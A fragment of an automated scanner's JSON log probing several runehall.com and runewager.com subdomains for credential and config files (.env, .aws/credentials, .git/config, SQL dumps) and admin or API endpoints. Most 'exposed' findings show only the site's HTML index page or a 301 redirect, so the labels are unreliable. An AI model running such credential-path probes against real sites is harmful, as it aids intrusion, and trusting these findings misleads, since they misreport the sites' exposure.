        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:18",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/config.php"
      },
      {
        "time": "22:03:18",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:18",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/config.json"
      },
      {
        "time": "22:03:18",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:19",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/credentials.json"
      },
      {
        "time": "22:03:19",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:19",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/docker-compose.yml"
      },
      {
        "time": "22:03:19",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:22",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/traefik.yml"
      },
      {
        "time": "22:03:22",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:22",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/admin"
      },
      {
        "time": "22:03:22",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:23",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/backup"
      },
      {
        "time": "22:03:23",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:24",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/sql"
      },
      {
        "time": "22:03:24",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:25",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/db.sql"
      },
      {
        "time": "22:03:25",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:28",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/dump.sql"
      },
      {
        "time": "22:03:28",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:28",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/backup.zip"
      },
      {
        "time": "22:03:28",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:28",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/.aws/credentials"
      },
      {
        "time": "22:03:28",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:28",
        "level": "debug",
        "message": "Testing API endpoints on https://staging.runewager.com"
      },
      {
        "time": "22:03:29",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/api/v1/user (200)"
      },
      {
        "time": "22:03:31",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/api/v1/admin (200)"
      },
      {
        "time": "22:03:33",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/api/v1/config (200)"
      },
      {
        "time": "22:03:34",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/graphql (200)"
      },
      {
        "time": "22:03:35",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/rest/v1/users (200)"
      },
      {
        "time": "22:03:47",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/oauth/token (200)"
      },
      {
        "time": "22:03:47",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/v2/api-docs (200)"
      },
      {
        "time": "22:03:48",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/swagger-ui.html (200)"
      },
      {
        "time": "22:03:48",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:48",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/swagger.json (200)"
      },
      {
        "time": "22:03:48",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:48",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/actuator (200)"
      },
      {
        "time": "22:03:49",
        "level": "warning",
        "message": "API endpoint exposed: https://staging.runewager.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "http://crash.runehall.com": {
    "findings": [
      {
        "time": "22:03:26",
        "level": "debug",
        "message": "Testing API endpoints on http://crash.runehall.com"
      },
      {
        "time": "22:03:28",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:03:35",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:03:37",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:03:41",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/graphql (301)"
      },
      {
        "time": "22:03:44",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:03:50",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:03:51",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:03:51",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:03:51",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:55",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:03:55",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:55",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/actuator (301)"
      },
      {
        "time": "22:03:56",
        "level": "warning",
        "message": "API endpoint exposed: http://crash.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://jbl.runehall.com": {
    "findings": [
      {
        "time": "22:03:28",
        "level": "debug",
        "message": "Testing API endpoints on http://jbl.runehall.com"
      },
      {
        "time": "22:03:29",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:03:31",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:03:32",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:03:33",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/graphql (301)"
      },
      {
        "time": "22:03:36",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:03:40",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:03:42",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:03:43",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:03:43",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:44",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:03:44",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:45",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/actuator (301)"
      },
      {
        "time": "22:03:47",
        "level": "warning",
        "message": "API endpoint exposed: http://jbl.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "https://sockets.runehall.com": {
    "findings": [
      {
        "time": "22:03:29",
        "level": "debug",
        "message": "Testing API endpoints on https://sockets.runehall.com"
      }
    ]
  },
  "https://support.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:03:30",
        "level": "debug",
        "message": "Testing GraphQL at https://support.runewager.com/graphql"
      }
    ]
  },
  "http://jbl.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:03:33",
        "level": "debug",
        "message": "Testing GraphQL at http://jbl.runehall.com/graphql"
      }
    ]
  },
  "https://staging.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:03:34",
        "level": "debug",
        "message": "Testing GraphQL at https://staging.runewager.com/graphql"
      }
    ]
  },
  "https://www.discord.runewager.com": {
    "findings": [
      {
        "time": "22:03:39",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/.env"
      },
      {
        "time": "22:03:39",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:40",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/.git/config"
      },
      {
        "time": "22:03:40",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:40",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/.svn/entries"
      },
      {
        "time": "22:03:40",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:40",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/.htaccess"
      },
      {
        "time": "22:03:40",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:42",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/web.config"
      },
      {
        "time": "22:03:42",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:44",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/robots.txt"
      },
      {
        "time": "22:03:44",
        "level": "debug",
        "message": "File content sample: # https://www.robotstxt.org/robotstxt.html User-agent: * Disallow: ..."
      },
      {
        "time": "22:03:45",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/sitemap.xml"
      },
      {
        "time": "22:03:45",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:45",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/crossdomain.xml"
      },
      {
        "time": "22:03:45",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:46",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/phpinfo.php"
      },
      {
        "time": "22:03:46",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:50",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/wp-config.php"
      },
      {
        "time": "22:03:50",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:51",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/config.php"
      },
      {
        "time": "22:03:51",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:54",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/config.json"
      },
      {
        "time": "22:03:54",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:54",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/credentials.json"
      },
      {
        "time": "22:03:54",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:54",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/docker-compose.yml"
      },
      {
        "time": "22:03:54",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:57",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/traefik.yml"
      },
      {
        "time": "22:03:57",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:59",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/admin"
      },
      {
        "time": "22:03:59",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:01",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/backup"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:01",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/sql"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:02",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/db.sql"
      },
      {
        "time": "22:04:02",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:03",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/dump.sql"
      },
      {
        "time": "22:04:03",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:04",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/backup.zip"
      },
      {
        "time": "22:04:04",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:05",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://www.discord.runewager.com/.aws/credentials"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "Testing API endpoints on https://www.discord.runewager.com"
      },
      {
        "time": "22:04:05",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/api/v1/user (200)"
      },
      {
        "time": "22:04:07",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/api/v1/admin (200)"
      },
      {
        "time": "22:04:07",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/api/v1/config (200)"
      },
      {
        "time": "22:04:08",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/graphql (200)"
      },
      {
        "time": "22:04:08",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/rest/v1/users (200)"
      },
      {
        "time": "22:04:09",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/oauth/token (200)"
      },
      {
        "time": "22:04:09",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/v2/api-docs (200)"
      },
      {
        "time": "22:04:09",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/swagger-ui.html (200)"
      },
      {
        "time": "22:04:09",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:10",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/swagger.json (200)"
      },
      {
        "time": "22:04:10",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:04:10",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/actuator (200)"
      },
      {
        "time": "22:04:10",
        "level": "warning",
        "message": "API endpoint exposed: https://www.discord.runewager.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "https://blog.runehall.com": {
    "findings": [
      {
        "time": "22:03:41",
        "level": "debug",
        "message": "Testing API endpoints on https://blog.runehall.com"
      },
      {
        "time": "22:03:55",
        "level": "warning",
        "message": "API endpoint exposed: https://blog.runehall.com/wp-json/wp/v2/users (200)"
      }
    ]
  },
  "http://crash.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:03:41",
        "level": "debug",
        "message": "Testing GraphQL at http://crash.runehall.com/graphql"
      }
    ]
  },
  "https://wss.runehall.com": {
    "findings": [
      {
        "time": "22:03:41",
        "level": "debug",
        "message": "Testing API endpoints on https://wss.runehall.com"
      }
    ]
  },
  "https://discord.runewager.com": {
    "findings": [
      {
        "time": "22:03:42",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/.env"
      },
      {
        "time": "22:03:42",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:42",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/.git/config"
      },
      {
        "time": "22:03:42",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:42",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/.svn/entries"
      },
      {
        "time": "22:03:42",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:43",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/.htaccess"
      },
      {
        "time": "22:03:43",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:43",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/web.config"
      },
      {
        "time": "22:03:43",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:45",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/robots.txt"
      },
      {
        "time": "22:03:45",
        "level": "debug",
        "message": "File content sample: # https://www.robotstxt.org/robotstxt.html User-agent: * Disallow: ..."
      },
      {
        "time": "22:03:45",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/sitemap.xml"
      },
      {
        "time": "22:03:45",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:46",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/crossdomain.xml"
      },
      {
        "time": "22:03:46",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:46",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/phpinfo.php"
      },
      {
        "time": "22:03:46",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:46",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/wp-config.php"
      },
      {
        "time": "22:03:46",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:47",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/config.php"
      },
      {
        "time": "22:03:47",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:47",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/config.json"
      },
      {
        "time": "22:03:47",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:48",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/credentials.json"
      },
      {
        "time": "22:03:48",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:49",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/docker-compose.yml"
      },
      {
        "time": "22:03:49",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:50",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/traefik.yml"
      },
      {
        "time": "22:03:50",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"icon\" href=\"images/rw.ico\"/><link rel=\"stylesheet\" href=\"https..."
      },
      {
        "time": "22:03:50",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://discord.runewager.com/admin"
      },
      {
        "time": "22:03:50",
        "level": "debug",
